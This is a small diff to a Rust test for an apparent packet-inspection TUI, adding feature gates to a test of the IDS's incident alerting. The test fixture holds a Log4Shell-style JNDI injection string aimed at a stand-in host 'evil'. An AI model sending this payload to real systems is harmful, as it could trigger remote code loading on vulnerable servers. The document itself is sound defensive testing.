@@ -1,10 +1,12 @@
 #[path = "support/packets.rs"]
 mod packets;
 
+#[cfg(feature = "terminal-ui")]
 use packrat_tui::app::App;
 use packrat_tui::net::security::SecurityEngine;
 
 #[test]
+#[cfg(feature = "terminal-ui")]
 fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
     let mut app = App::new_for_test();
     let payload = b"GET /${jndi:ldap://evil/x} HTTP/1.1\r\nHost: example\r\n\r\n";
